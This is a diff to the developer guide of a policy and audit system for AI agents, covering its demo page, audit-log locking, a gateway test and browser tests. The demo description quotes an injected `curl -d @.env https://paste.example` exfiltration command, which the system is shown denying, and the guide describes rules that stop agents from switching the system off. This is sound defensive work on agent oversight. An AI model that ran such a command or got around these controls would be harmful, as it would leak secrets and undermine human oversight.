@@ -31,7 +31,7 @@ AI Security Command Center (`ascc`) is a policy decision point for AI agents. Th
   WebAssembly on a planted setup and shows an injected `curl -d @.env https://paste.example` denied on first
   load. The visitor can edit the policy, replay calls, edit the audit log and flip the kill switch.
   `.github/workflows/pages.yml` publishes it from `main` to
-  `https://ai-automation-tools.dev/ai-security-command-center/`, after the page test passes.
+  `https://ai-security-command-center-demo.ai-automation-tools.dev/`, after the page test passes.
 
 Public-MVP spec: `docs/product/spec.md`. Slice order: `docs/product/build-plan.md`. Work queue:
 `docs/ROADMAP.md`. The full platform design (gateway, STS, egress, broker, plugin host, connectors, console) is
@@ -73,7 +73,8 @@ decision goes in as an ADR amendment there, never as a quiet code change.
   and builds its document from their bytes. A new location is added there and `LocationsVersion` changes with
   it. `src/cmd/ascc/discover.go` walks the root.
 - `src/cmd/ascc/store.go` is the only place that locks, appends to the audit log or rewrites the registry.
-  The lock is a lock file (`<log>.lock`, cleared after 30 s if a hook died holding it): the standard library
+  `kill` and `revive` hold the audit log's lock from reading the registry to writing their audit line, so two
+  at once both land; `TestParallelKillsAllLand` is the proof. The lock is a lock file (`<log>.lock`, cleared after 30 s if a hook died holding it): the standard library
   has no portable file lock, and `golang.org/x/sys` isn't worth a dependency for it.
 - **The `pdp`, `audit`, `claudecode` and `demo` packages do no I/O.** They take bytes and return values, so the
   WebAssembly demo (`GOOS=js GOARCH=wasm`) imports exactly the code the CLI runs; CI builds them for that
@@ -88,7 +89,8 @@ decision goes in as an ADR amendment there, never as a quiet code change.
   shape. It adds no decision logic. Every answer on any path but `/healthz` is a decision, and a deny unless
   the engine said allow: a bad request, a repeated or miscased key, a file that won't load, a panic and a log
   line that can't be written are all denies, each with a test. It reads the files on every request so the
-  kill switch needs no restart. It has no caller authentication and no audit chain yet; its guide says so.
+  kill switch needs no restart. On an interrupt or the terminate signal it stops listening and lets requests
+  in flight finish before it exits. It has no caller authentication and no audit chain yet; its guide says so.
 - `deploy/compose/` is the development stack (TKT-006): Postgres, Keycloak, OpenBao, Jaeger, `ascc-pdp` and a
   deny-everything Envoy as the egress placeholder. It is for one developer's machine and its README says so.
   `stack_test.go` there holds its rules and `go test ./...` runs them: every port on `127.0.0.1`, every image
@@ -104,6 +106,12 @@ decision goes in as an ADR amendment there, never as a quiet code change.
   imports it and the four verify commands skip it (`gofmt -l .` still covers it). CI runs `go vet ./...` and
   `go test ./...` inside that folder. `pluginv1alpha1/` and `CONTRACT.md` there are generated from
   `proto/plugin.proto`; its README has the command.
+- `src/spikes/gatewayrun` is the TKT-001 run, **also a Go module of its own** and for the same reason. Its test
+  starts a real agentgateway between a stub MCP server and a stub `ext_mcp` policy service and pins the six
+  results in the gateway report to what v1.7.0 does. It needs the release binary named in `ASCC_AGENTGATEWAY`
+  and skips without it; CI's `gateway` job downloads the release, checks its SHA-256 and runs it. `extmcp/`
+  there is agentgateway's contract and generated code, copied at the tag and changed only by `gofmt`. Moving
+  to a later release means the checksum in `ci.yml`, the three copied files and a reread of the report.
 - Must build and test on Windows and Linux (CI runs both). Use `path/filepath`, never hard-coded separators.
 - Settings and secrets live in `.env` at the repo root, names in `.env.example`; the real environment wins.
   `ascc` has none today; the development stack's four secrets are there. If `ascc` ever needs one, load it
@@ -156,7 +164,11 @@ go build ./...
   added. For the demo, `TestBuiltPageRendersWithNoNetwork` builds the site and runs its scripts in Node with
   `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource` and `sendBeacon` stubbed to throw: the page must render
   the planted deny and never call one. The page's content policy sets `connect-src 'none'` as well. That test
-  needs `node` on `PATH`: it skips without it locally and fails without it in CI.
+  needs `node` on `PATH`: it skips without it locally and fails without it in CI. `TestBuiltPageInABrowser`
+  walks the page again in headless Chromium (Playwright, `src/cmd/buildsite/testdata/browser/`), where any
+  request for something other than the site's own files, and any console error, fails it. It runs with
+  `ASCC_BROWSER_TEST` set, which CI's `browser` job does. A change to the page's buttons or ids is made in
+  `site/`, `testdata/render.js` and `page.test.mjs` together.
 - **A call that can't be recorded doesn't happen.** If the audit append fails or can't get the lock, the hook
   exits 2 even when policy said allow.
 - **An agent can't switch ascc off.** `touches_ascc_state` covers writes to the registry, policies, audit log
